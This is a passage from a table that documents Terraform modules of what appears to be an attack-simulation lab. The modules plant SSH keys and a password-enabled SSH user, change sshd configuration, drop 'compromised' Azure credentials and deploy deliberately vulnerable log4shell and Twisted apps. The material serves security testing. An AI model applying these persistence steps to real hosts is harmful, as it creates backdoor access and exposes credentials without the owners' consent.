vuln\_python3\_twisted\_app\_target \-X quit<br/>            screen \-wipe<br/>            screen \-d \-L \-Logfile /tmp/vuln\_python3\_twisted\_app\_target\.log \-S vuln\_python3\_twisted\_app\_target \-m python3 /vuln\_python3\_twisted\_app/app\.py<br/>            screen \-S vuln\_python3\_twisted\_app\_target \-X colon &quot;logfile flush 0^M&quot;<br/>            sleep 30<br/>            log &quot;check app url\.\.\.&quot;<br/>            while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>                log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>                sleep 60<br/>            done<br/>            log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>            sleep 1800<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop\.\.\.&quot;<br/>            fi<br/>        done<br/>    else<br/>        log &quot;python twisted vulnerability required the following package installed:&quot;<br/>        log &quot;python3\-twisted/focal\-updates,focal\-security,now 18\.9\.0\-11ubuntu0\.20\.04\.1&quot;<br/>    fi<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl python3\-pip&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl python3\-pip&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    app\_py = templatefile\(<br/>                &quot;$\{path\.module\}/resources/app\.py&quot;,<br/>                \{<br/>                    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>                \}\)<br/>    requirements = templatefile\(<br/>                &quot;$\{path\.module\}/resources/requirements\.txt&quot;,<br/>                \{<br/>                \}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| attacker-ssh-keys                                        | ./modules/runbook/deploy-ssh-keys                    | runbook_deploy_secret_ssh_private                | context.azure.runbook.ssh_keys                                    | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;ssh_keys&quot;: {<br/>                    &quot;enabled&quot;: false,<br/>                    &quot;ssh_authorized_keys_path&quot;: &quot;/home/sshuser/.ssh/authorized_keys&quot;,<br/>                    &quot;ssh_private_key_path&quot;: &quot;/home/sshuser/.ssh/secret_key&quot;,<br/>                    &quot;ssh_public_key_path&quot;: &quot;/home/sshuser/.ssh/secret_key.pub&quot;<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-keys                    | <pre>\# ssh key<br/>resource &quot;tls\_private\_key&quot; &quot;ssh&quot; \{<br/>  algorithm = &quot;RSA&quot;<br/>  rsa\_bits  = &quot;4096&quot;<br/>\}<br/><br/>locals \{<br/>    ssh\_private\_key = base64encode\(tls\_private\_key\.ssh\.private\_key\_pem\)<br/>    ssh\_private\_key\_path = var\.inputs\[&quot;ssh\_private\_key\_path&quot;\]<br/>    ssh\_public\_key = base64encode\(chomp\(tls\_private\_key\.ssh\.public\_key\_openssh\)\)<br/>    ssh\_public\_key\_path = var\.inputs\[&quot;ssh\_public\_key\_path&quot;\]<br/>    ssh\_authorized\_keys\_path = var\.inputs\[&quot;ssh\_authorized\_keys\_path&quot;\]<br/>    public\_key\_user = split\(&quot;/&quot;, local\.ssh\_public\_key\_path\)\[1\] == &quot;root&quot; ? &quot;root&quot; : split\(&quot;/&quot;, local\.ssh\_public\_key\_path\)\[2\]<br/>    private\_key\_user = split\(&quot;/&quot;, local\.ssh\_private\_key\_path\)\[1\] == &quot;root&quot; ? &quot;root&quot; : split\(&quot;/&quot;, local\.ssh\_private\_key\_path\)\[2\]<br/><br/>    payload\_public = &lt;&lt;\-EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating public key: $\{local\.ssh\_public\_key\_path\}&quot;<br/>    log &quot;adding user: $\{local\.public\_key\_user\}\.\.\.&quot;<br/>    adduser \-\-gecos &quot;&quot; \-\-disabled\-password &quot;$\{local\.public\_key\_user\}&quot; \|\| log &quot;$\{local\.public\_key\_user\} user already exists&quot;<br/>    mkdir \-p $\{dirname\(local\.ssh\_public\_key\_path\)\}<br/>    chown \-R $\{local\.public\_key\_user\}:$\{local\.public\_key\_user\} $\{dirname\(local\.ssh\_public\_key\_path\)\}<br/>    echo &#x27;$\{base64decode\(local\.ssh\_public\_key\)\}&#x27; &gt; $\{local\.ssh\_public\_key\_path\}<br/>    echo &#x27;$\{base64decode\(local\.ssh\_public\_key\)\}&#x27; &gt;&gt; $\{local\.ssh\_authorized\_keys\_path\}<br/>    sort $\{local\.ssh\_authorized\_keys\_path\} \| uniq &gt; $\{local\.ssh\_authorized\_keys\_path\}\.uniq<br/>    mv $\{local\.ssh\_authorized\_keys\_path\}\.uniq $\{local\.ssh\_authorized\_keys\_path\}<br/>    chmod 600 $\{local\.ssh\_public\_key\_path\} $\{local\.ssh\_authorized\_keys\_path\}<br/>    chown \-R $\{local\.public\_key\_user\}:$\{local\.public\_key\_user\} $\{local\.ssh\_public\_key\_path\} $\{local\.ssh\_authorized\_keys\_path\}<br/>    log &quot;public key: $\(ls \-l $\{local\.ssh\_public\_key\_path\}\)&quot;<br/>    log &quot;authorized key: $\(ls \-l $\{local\.ssh\_authorized\_keys\_path\}\)&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64\_payload\_public = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;public\_tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload\_public<br/>    \}\}\)<br/><br/>    payload\_private = &lt;&lt;\-EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating private key: $\{local\.ssh\_private\_key\_path\}&quot;<br/>    log &quot;adding user: $\{local\.private\_key\_user\}\.\.\.&quot;<br/>    adduser \-\-gecos &quot;&quot; \-\-disabled\-password &quot;$\{local\.private\_key\_user\}&quot; \|\| log &quot;$\{local\.private\_key\_user\} user already exists&quot;<br/>    mkdir \-p $\{dirname\(local\.ssh\_private\_key\_path\)\}<br/>    echo &#x27;$\{base64decode\(local\.ssh\_private\_key\)\}&#x27; &gt; $\{local\.ssh\_private\_key\_path\}<br/>    chmod 600 $\{local\.ssh\_private\_key\_path\}<br/>    chown $\{local\.private\_key\_user\}:$\{local\.private\_key\_user\} $\{local\.ssh\_private\_key\_path\}<br/>    log &quot;private key: $\(ls \-l $\{local\.ssh\_private\_key\_path\}\)&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64\_payload\_private = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;private\_tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload\_private<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload\_public = base64gzip\(local\.base64\_payload\_public\)<br/>        base64\_uncompressed\_payload\_public = base64encode\(local\.base64\_payload\_public\)<br/>        base64\_payload\_private = base64gzip\(local\.base64\_payload\_private\)<br/>        base64\_uncompressed\_payload\_private = base64encode\(local\.base64\_payload\_private\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| attacker-ssh-user                                        | ./modules/runbook/deploy-ssh-user                    | runbook_deploy_ssh_user                          | context.azure.runbook.ssh_user                                    | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;ssh_user&quot;: {<br/>                    &quot;enabled&quot;: false,<br/>                    &quot;password&quot;: null,<br/>                    &quot;username&quot;: &quot;lou.caloozer&quot;<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-user                    | <pre>locals \{<br/>    password = try\(length\(var\.inputs\[&quot;password&quot;\]\),&quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;password&quot;\] :  random\_password\.password\.result<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;Setting up user: $\{var\.inputs\[&quot;username&quot;\]\}&quot;<br/>    adduser \-\-gecos &quot;&quot; \-\-disabled\-password $\{var\.inputs\[&quot;username&quot;\]\} \|\| log &quot;$\{var\.inputs\[&quot;username&quot;\]\} user already exists&quot;<br/>    log &quot;Setting passwd: $\{local\.password\}&quot;<br/>    echo &#x27;$\{var\.inputs\[&quot;username&quot;\]\}:$\{local\.password\}&#x27; \| chpasswd<br/>    log &quot;Adding user to allowed passwd auth in sshd\_config\.d&quot;<br/>    cat &gt; /etc/ssh/sshd\_config\.d/common\-user\-passwd\-auth\.conf &lt;&lt;\-EOF <br/>    \# Configuration to allow key authentication only and display a message on password attempt<br/>    Match User root,admin,test,guest,info,adm,mysql,user,administrator,oracle,ftp,pi,puppet,ansible,ec2\-user,vagrant<br/>        AuthenticationMethods publickey<br/>        PasswordAuthentication no<br/>        ForceCommand /bin/echo &#x27;We talked about this guys\. No SSH for you\!&#x27;<br/>    EOF<br/>    cat &gt; /etc/ssh/sshd\_config\.d/custom\-user\-passwd\-auth\.conf &lt;&lt;\-EOF <br/>    Match User $\{var\.inputs\[&quot;username&quot;\]\}<br/>        AuthenticationMethods publickey password<br/>        PasswordAuthentication yes<br/>    EOF<br/>    log &quot;Restarting ssh service&quot;<br/>    service ssh reload<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>        password = local\.password<br/>    \}<br/>\}<br/><br/>resource &quot;random\_password&quot; &quot;password&quot; \{<br/>  length           = 16<br/>  special          = true<br/>  override\_special = &quot;\!\#$%&amp;\*\(\)\-\_=\+\[\]\{\}&lt;&gt;:?&quot;<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-azure-credentials                               | ./modules/runbook/deploy-azure-credentials           | runbook_deploy_secret_azure_credentials          | context.azure.runbook.azure_credentials                           | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;azure_credentials&quot;: {<br/>                    &quot;compromised_keys_user&quot;: null,<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-azure-credentials           | <pre>locals \{<br/>    tool = &quot;az&quot;<br/>    azure\_creds = var\.inputs\[&quot;compromised\_credentials&quot;\]\[var\.inputs\[&quot;compromised\_keys\_user&quot;\]\]\.rendered<br/>    \# AZURE\_CLIENT\_ID: The Application \(client\) ID of the service principal\.<br/>    \# AZURE\_CLIENT\_SECRET: The client secret for the service principal\.<br/>    \# AZURE\_TENANT\_ID: The Tenant ID associated with your Azure subscription\.<br/>    \# AZURE\_SUBSCRIPTION\_ID: Your Azure Subscription ID\.<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Deploying azure credentials\.\.\.&quot;<br/>    mkdir \-p ~/\.azure<br/>    if \[  &quot;$\{ local\.azure\_creds == &quot;&quot; ? &quot;false&quot; : &quot;true&quot; \}&quot; == &quot;true&quot; \]; then<br/>      echo $\{base64gzip\(local\.azure\_creds\)\} \| base64 \-d \| gunzip &gt; ~/\.azure/my\.azureauth<br/>      export AZURE\_AUTH\_LOCATION=~/\.azure/my\.azureauth<br/>    fi<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &amp;&gt;/dev/null; do<br/>            log &quot;$\{local\.tool\} not found \- waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &amp;&gt;/dev/null; do<br/>            log &quot;$\{local\.tool\} not found \- waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| attacker-vulnerable-docker-log4j-app                     | ./modules/runbook/deploy-docker-log4j-app            | runbook_deploy_docker_log4j_app                  | context.azure.runbook.vulnerable.docker.log4j_app                 | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;docker&quot;: {<br/>                        &quot;log4j_app&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;listen_port&quot;: 8000<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker-log4j-app            | <pre>locals \{<br/>    image = &quot;ghcr\.io/christophetd/log4shell\-vulnerable\-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929&quot;<br/>    name = &quot;log4shell&quot;<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        if \[\[ \`sudo docker ps \| grep $\{local\.name\}\` \]\]; then docker stop $\{local\.name\}; fi<br/>        log &quot;$\(echo &#x27;docker run \-d \-\-name $\{local\.name\} \-v /tmp:/tmp \-\-rm \-p $\{local\.listen\_port\}:8080 $\{local\.image\}&#x27;\)&quot;<br/>        docker run \-d \-\-name $\{local\.name\} \-v /tmp:/tmp \-\-rm \-p $\{local\.listen\_port\}:8080 $\{local\.image\} &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        docker ps \-a &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;curl&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;curl&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| attacker-vulnerable-log4j-app                            | ./modules/runbook/deploy-log4j-app                   | runbook_deploy_log4j_app                         | context.azure.runbook.vulnerable.log4j_app                        | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;log4j_app&quot;: {<br/>                        &quot;enabled&quot;: false,<br/>                        &quot;listen_port&quot;: 8080<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-log4j-app                   | <pre>locals \{<br/>    app\_dir = &quot;/vuln\-log4j\-app&quot;<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    screen \-S vuln\_log4j\_app\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_log4j\_app\_target\.log<br/>    <br/>    rm \-rf $\{local\.app\_dir\}<br/>    mkdir $\{local\.app\_dir\}<br/>    cd $\{local\.app\_dir\}<br/><br/>    log &quot;creating local files\.\.\.&quot;<br/>    echo $\{base64gzip\(local\.web\)\} \| base64 \-d \| gunzip &gt; web\.py<br/>    echo $\{base64gzip\(local\.ldap\)\} \| base64 \-d \| gunzip  &gt; ldap\.py<br/>    echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip &gt; requirements\.txt<br/><br/>    \# install java 8u131<br/>    log &quot;checking for jdk1\.8\.0\_131\.\.\.&quot;<br/>    if \[ \! \-d /usr/java/jdk1\.8\.0\_131/ \]; then<br/>        log &quot;jdk1\.8\.0\_131 not found \- installing\.\.\.&quot;<br/>        wget \-c \-\-header &quot;Cookie: oraclelicense=accept\-securebackup\-cookie&quot; http://download\.oracle\.com/otn\-pub/java/jdk/8u131\-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk\-8u131\-linux\-x64\.tar\.gz<br/>        mkdir \-p /usr/java<br/>        sudo tar \-xvzf jdk\-8u131\-linux\-x64\.tar\.gz \-C /usr/java<br/>    else<br/>        log &quot;jdk1\.8\.0\_131 found \- skipping install&quot;<br/>    fi<br/>    <br/><br/>    \# update java path<br/>    log &quot;setting up java environment for build\.\.\.&quot;<br/>    export JAVA\_HOME=/usr/java/jdk1\.8\.0\_131/<br/>    sudo update\-alternatives \-\-install /usr/bin/java java $$\{JAVA\_HOME%\*/\}/bin/java 20000<br/>    sudo update\-alternatives \-\-install /usr/bin/javac javac $$\{JAVA\_HOME%\*/\}/bin/javac 20000<br/>    <br/>    java \-version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    \# download gradle 7\.3\.1<br/>    log &quot;checking for gradle 7\.3\.1\.\.\.&quot;<br/>    if \[ \! \-d /opt/gradle/gradle\-7\.3\.1 \]; then<br/>        log &quot;gradle not found \- installing\.\.\.&quot;<br/>        wget https://services\.gradle\.org/distributions/gradle\-7\.3\.1\-bin\.zip<br/>        mkdir /opt/gradle<br/>        unzip \-d /opt/gradle gradle\-7\.3\.1\-bin\.zip<br/>    else<br/>        log &quot;gradle 7\.3\.1 found \- skipping install&quot; <br/>    fi<br/><br/>    \# update gradle path<br/>    log &quot;updating environment PATH to include gradle\.\.\.&quot;<br/>    export PATH=$PATH:/opt/gradle/gradle\-7\.3\.1/bin<br/>    gradle \-\-version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    \# clone the log4shell vulnerable app<br/>    log &quot;cloning https://github\.com/christophetd/log4shell\-vulnerable\-app\.\.\.&quot;<br/>    git clone https://github\.com/christophetd/log4shell\-vulnerable\-app<br/>    cd log4shell\-vulnerable\-app<br/>    log &quot;running gradle build\.\.\.&quot;<br/>    nohup gradle bootJar \-\-no\-daemon &amp;<br/>    GRADLE\_PID=$\!<br/>    while kill \-0 $GRADLE\_PID 2&gt; /dev/null; do<br/>        log &quot;Process is still running\.\.\.&quot;<br/>        sleep 30<br/>    done<br/>    log &quot;gradle build complete\.&quot;<br/>    <br/>    ls \-ltr build/libs/\*\.jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    \# copy java jar<br/>    log &quot;Copying java jar\.\.&quot;<br/>    cp build/libs/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar $\{local\.app\_dir\}/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    <br/>    \# change to app root dir<br/>    cd $\{local\.app\_dir\}<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        log 